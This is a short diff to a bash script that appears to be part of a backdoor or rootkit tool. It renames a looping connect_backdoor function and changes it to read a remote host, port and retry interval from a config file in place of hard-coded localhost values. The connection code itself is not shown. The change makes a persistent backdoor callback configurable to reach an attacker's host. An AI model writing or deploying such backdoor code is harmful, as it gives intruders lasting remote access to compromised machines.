@@ -1,10 +1,12 @@
 #!/bin/bash
 
-function connect_backdoor()
+. config.sh
+
+function br_connect_backdoor()
 {
-	local target_ip="localhost"
-	local target_port=8080
-	local sleep_time=60
+	local target_ip=$br_remote_host
+	local target_port=$br_remote_port
+	local sleep_time=$br_sleep_time
 
 	while [ 1 ]
 	do	
@@ -27,4 +29,11 @@ function connect_backdoor()
 	done
 }
 
-connect_backdoor
+function br_loadconfig()
+{
+        br_load_config br.conf
+        #br_display_config
+}
+
+br_loadconfig
+br_connect_backdoor
